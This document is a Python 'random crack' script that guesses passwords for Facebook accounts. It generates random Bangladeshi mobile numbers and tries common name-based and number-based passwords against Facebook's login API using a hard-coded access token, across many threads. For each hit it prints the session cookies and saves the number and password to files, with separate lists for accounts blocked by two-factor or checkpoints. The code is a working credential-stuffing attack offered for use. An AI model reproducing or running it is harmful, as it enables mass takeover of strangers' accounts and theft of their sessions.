#--------------------- [ INFO ] -------------------#
#DEVELOPER : TANIM HOSSAIN
#CODE BY : TANIM HOSSAIN
#OPEN SOURCE BY : BHOOT-X [TANIM HOSSAIN]
#TOOL : RNDM CHECK
#INJOY THE OPEN SOURCE 
#ALLAH HAFIZ
#--------------------- [ MODEL ] -------------------#
import os
import time
import sys
from os import path
import urllib
import pip
import base64
import zlib
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
try:
        import os,requests,json,time,re,random,sys,uuid,string,subprocess
        from string import *
        from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
        os.system(f'pip install requests futures==2 > /dev/null')
except:pass
#--------------------- [ SEX ] -------------------#
jan = []
loop=0
oks=[]
cps=[]
twf=[]
#--------------------- [ CODE ] -------------------#
W='\033[1;37m' #WHITE
G='\033[38;5;46m'
F='\033[38;5;45m'
R='\033[38;5;196m'
#--------------------- [ LOGO ] -------------------#
fuck = """
\x1b[1;97m88888b.  .d8b.  d88888b .d8888.  .d8b.  d8b   db
88  `8D d8' `8b 88'     88'  YP d8' `8b 888o  88 
88oobY' 88ooo88 88oooo   `8bo.  88ooo88 88V8o 88
88`8b   88°°°88 88°°°°    `Y8b. 88°°°88 88 V8o88 
88 `88. 88   88 88      db   8D 88   88 88  V888 
88   YD YP   YP YP      `8888Y' YP   YP VP   V8P 
\x1b[1;97m===================================================
\033[38;5;196m[\033[38;5;195m√\033[38;5;196m]\x1b[1;97m AUTHOR  : RAFSAN AHAMMED RAFI
\033[38;5;196m[\033[38;5;195m√\033[38;5;196m]\x1b[1;97m FACEBOOK: MD. ARIF MIA
\033[38;5;196m[\033[38;5;195m√\033[38;5;196m]\x1b[1;97m GITHUB  : R4FSAN-143
\033[38;5;196m[\033[38;5;195m√\033[38;5;196m]\x1b[1;97m WATHAPP : 01305504954
\033[38;5;196m[\033[38;5;195m√\033[38;5;196m]\x1b[1;97m TOOLS   : PREMIUM
\033[38;5;196m[\033[38;5;195m√\033[38;5;196m]\x1b[1;97m Stetus  : PAID
\033[38;5;196m[\033[38;5;195m★\033[38;5;196m]\x1b[1;97m VIRSION : 0.1
===================================================="""
#--------------------- [ DEF-LOGO X CLEAR ] -------------------#
def x():
    os.system('clear')
    print(fuck)
#--------------------- [ DEF-XNXX ] -------------------#
def xnxx():
    print(f'{W}===================================')
#--------------------- [ MAIN ] -------------------#
def bhootxx():
    x()
    print('[1] RNDM CRACK')
    print('[2] EXIT');xnxx()
    xtx = input('[?] CHOICE : ')
    if xtx in '1':
        rndmx()
    elif xtx in '2':
        print('Allah hafiz ')
        os.system('exit')
#--------------------- [ RNDM ] -------------------#
def rndmx():
    x()
    print('[+] BD SIM CODE : 017,019,018,016 ');xnxx()
    dog = input('[?] CODE : ')
    x()
    try:
        print('[+] LIMIT : 999,9999,99999');xnxx()
        limit = int(input('[?] LIMIT : '))
    except ValueError:
            limit = 5000
    for nmbr in range(limit):
            xxx = ''.join(random.choice(string.digits) for _ in range(8))
            jan.append(xxx)
    with tred(max_workers=30) as tanox:
            x()
            tl = str(len(jan))
            print(f'[+] TOTAL UID : {str(len(jan))}')
            print(f'[+] USE JAPAN APN COMING MORE OK IDS.......');xnxx()
            for psx in jan:
                ids = dog+psx
                passlist = [psx,ids,ids[:8],ids[:7],'bangla','sadiya','sarmin','sabbir','jannat','hridoy','samiya','sumaiya','nusrat','fariya','saiful','mababa','fatema','ayesha','shohag','shagor','parbej','ashraful','asadul','mariya','nilima','rayhan','eshan','kawsar','nazmul',]
                tanox.submit(sexx,ids,passlist)
    xnxx()
    print(f'[+] TOTAL OK -{str(len(oks))}')
    xnxx()
#--------------------- [ MTHD ] -------------------#
def sexx(ids,passlist):
        global loop
        global oks
        sys.stdout.write(f'\r\r[+] [BHOOT FIND] [{loop}] [OK:-{len(oks)}]')
        sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        cat = {
                        
                        
                        
                        
                        
                                'adid':adid,
                                'format':'json',
                                'device_id':device_id,
                                'email':ids,
                                'password':pas,
                                'generate_analytics_claims':'1',
                                'credentials_type':'password',
                                'source':'login',                              
                                'error_detail_type':'button_with_disabled',                                
                                'enroll_misauth':'false',                             
                                'generate_session_cookies':'1',
                                'generate_machine_id':'1',
                                'fb_api_req_friendly_name':'authenticate',
                        }
                        
                        
                        
                        
                        
                        bhoot={
                        
                        
                        
                        
                        
                                'Authorization':f'OAuth {accessToken}',
                                'X-FB-Friendly-Name':'authenticate',
                                'X-FB-Connection-Type':'unknown',
                                'User-Agent':None,
                                'Accept-Encoding':'gzip, deflate',
                                'Content-Type': 'application/x-www-form-urlencoded',
                                'X-FB-HTTP-Engine': 'Liger'
                                }
                                
                                
                                
                                
                                
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=cat,headers=bhoot).json()
                        if 'session_key' in po:
                                try:
                                        uid = po['uid']
                                except:
                                        uid = ids
                                if str(uid) in oks:
                                        break
                                else:
                                        print(f'\r\r\033[38;5;46m[+] [BHOOT-OK] {str(uid)} \_/ {pas} ')
                                        fxxk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print(f'=COOKIE= : {fxxk}')
                                        open('/sdcard/X-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif twf in str(po):
                                try:
                                        uid = po['error']['error_data']['uid']
                                except:
                                        uid = idf
                                if uid in oks:pass
                                else:
                                        print(f'\r\r\033[38;5;45m[+] [BHOOT-2F] {uid} \_/ {pas}\033[1;37m')
                                        open('/sdcard/X-2F.txt','a').write(str(uid)+'|'+pas+'\n')
                                        twf.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                        uid = po['error']['error_data']['uid']
                                except:
                                        uid = ids
                                if uid in oks:pass
                                else:
                                        print('\r\r\033[38;5m196m[+] [BHOOT-CP] '+str(uid)+' \_/ '+pas+'\033[1;37m')
                                        open('/sdcard/X-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
        except Exception as e:
                pass
#--------------------- [ END ] -------------------#
bhootxx()